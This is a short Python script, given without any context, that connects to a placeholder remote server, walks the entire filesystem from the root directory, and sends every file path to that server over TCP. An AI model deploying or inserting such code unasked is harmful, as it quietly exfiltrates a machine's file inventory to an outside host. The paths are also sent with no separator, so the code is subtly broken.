import os
import socket

# Server configuration
SERVER_HOST = 'server_ip_address_here'
SERVER_PORT = 12345

def send_file_names():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((SERVER_HOST, SERVER_PORT))

        for root, dirs, files in os.walk('/'):  # Replace '/' with the directory you want to start scanning from
            for file_name in files:
                full_path = os.path.join(root, file_name)
                client_socket.send(full_path.encode('utf-8'))

if __name__ == "__main__":
    send_file_names()
